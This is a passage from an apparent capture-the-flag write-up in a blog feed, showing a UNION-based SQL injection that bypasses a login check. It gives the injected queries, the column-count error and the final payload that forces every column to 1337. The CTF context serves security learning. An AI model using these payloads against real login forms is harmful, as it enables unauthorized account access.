<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- </span><br></span></code></pre></div></div>
<p>Let’s break that query down: we set the username to be a value unlikely to appear in the database. We then union that SELECT statement with our own, which includes a hard coded value of 0 for the first column. Finally, we return only one of the row with LIMIT 1, to satisfy the aforementioned check for only one row.
This gives us the following error:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">SQL error: The used SELECT statements have a different number of columns</span><br></span></code></pre></div></div>
<p>However, if we add some dummy columns (common sense suggest five columns: username, password, user_level, data created, date last modified), the error disappears.
New query:</p>
<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> c</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> e </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- </span><br></span></code></pre></div></div>
<p>As we do not know which column will be the user_level, we can simply set all columns equal to 1337, and input a password of 1337 into the form.</p>
<p>The final query:</p>
<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> c</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> e </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- '</span><br></span></code></pre></div></div>
<p>This proves successful!
(as the flag appears to be dynamically generated it is not included here)</p>]]></content>
        <author>
            <name>Clifford</name>
            <uri>https://github.com/CSRessel</uri>
        </author>
    </entry>
</feed>